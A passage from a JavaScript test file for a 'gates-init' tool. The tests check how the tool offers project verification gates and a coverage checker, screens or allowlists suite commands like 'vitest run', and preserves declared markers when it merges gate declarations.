    assert.doesNotMatch(text, /declare your own/, 'advice over a file we could not read is guesswork');
  });

  it('when the DECLARATION already carries a project gate the note narrows to the offer — it never claims the matrix proves nothing', () => {
    mkProject({
      scripts: { test: 'turbo run test' },
      config: COUNCIL,
      gates: { gates: [{ id: 'suite', title: 'S', cmd: `${PRODUCER_BODY} test/*.test.mjs` }] },
    });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /offer adds no project-verification gate/i, 'the offer-level fact is still stated');
    assert.doesNotMatch(text, /would prove only/, 'but the matrix claim is FALSE here — a declared suite gate runs');
  });
});

// ── the fill on a FOREIGN project (the suite the closed producer world cannot express) ──

describe('gates-init — the fill over a project whose primary suite is not a `node --test` form', () => {
  // The builder's temp root is used as a project ROOT here, and the deployment preflight refuses a
  // symlinked one — on a host whose tmp dir is a link (macOS /tmp) the raw path is exactly that.
  const foreign = (options) => {
    const fixture = buildForeignFixture(options);
    return { ...fixture, root: realpathSync(fixture.root) };
  };
  const councilAt = (rel = join('docs', 'ai', 'orchestration.json')) => ({ [rel]: `${JSON.stringify(COUNCIL, null, 2)}\n` });

  it('a screened-out suite body leaves the checker candidate WITHHELD, by name', () => {
    const fx = foreign({ extraFiles: councilAt() });
    try {
      const offer = buildOffer(fx.root);
      assert.ok(!offer.entries.some((e) => e.id === 'coverage-check'), 'no checker is offered over a project with no producer');
      assert.ok(offer.notes.some((n) => /screened out/.test(n)), `the vitest body is named as screened: ${offer.notes.join(' | ')}`);
      assert.ok(offer.notes.some((n) => /withheld/.test(n) && /PRODUCE/.test(n)), 'and the withhold states WHY');
      assert.doesNotMatch(offer.notes.join('\n'), new RegExp(FOREIGN_TEST_SCRIPT.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')), 'no screened body is echoed back');
    } finally {
      fx.teardown();
    }
  });

  it('an ALLOWLISTED foreign suite IS offered — and still never counts as the producer', () => {
    // The sharp edge: `vitest run` passes the body allowlist, so a suite gate really is offered. Only
    // the ONE self-contained `node --test` body is rewritten into the producer form, so the offer
    // cannot make this project's suite write the lcov — and the checker stays withheld over it.
    const fx = foreign({ testScript: 'vitest run', extraFiles: councilAt() });
    try {
      const offer = buildOffer(fx.root);
      const suite = offer.entries.find((e) => e.id === 'test');
      assert.ok(suite, `the allowlisted suite body is offered: ${offer.entries.map((e) => e.id).join(', ')}`);
      assert.equal(matchesCoverageProducer(suite.cmd), false, 'the offered suite claims nothing about the lcov');
      assert.ok(!offer.entries.some((e) => e.id === 'coverage-check'), 'so the checker is still not offered');
      assert.ok(offer.notes.some((n) => /withheld/.test(n) && /PRODUCE/.test(n)));
    } finally {
      fx.teardown();
    }
  });

  it('a merge over a MARKER-carrying declaration validates, places the checker LAST and preserves the marker byte-for-byte', () => {
    const marked = { id: 'suite', title: 'Suite', cmd: FOREIGN_TEST_SCRIPT, lcovProducer: true };
    const fx = foreign({ gates: [marked], extraFiles: councilAt() });
    try {
      const offer = buildOffer(fx.root);
      assert.ok(offer.entries.some((e) => e.id === 'coverage-check'), 'the DECLARED claim is what unlocks the checker candidate');
      const result = applyFill({ cwd: fx.root }, {});
      assert.equal(result.outcome, 'written');
      const raw = readFileSync(join(fx.root, GATES_REL), 'utf8');
      assert.match(raw, /"lcovProducer": true/, 'the marker survives in the written bytes');
      const written = JSON.parse(raw).gates;
      assert.deepEqual(written[0], marked, 'the marked entry round-trips key for key — the fill is add-only');
      assert.deepEqual(written.map((g) => g.id), ['suite', 'review-state', 'coverage-check']);
      validateDeclaration({ gates: written });
      assert.equal(isFinalCapableDeclaration(written, fx.root), true, 'the written declaration is one --final accepts');
      assert.equal(coverageProducerPrecedes(written, written.length - 1), true, 'and the claimed producer precedes the checker');
    } finally {
      fx.teardown();
    }
  });
});
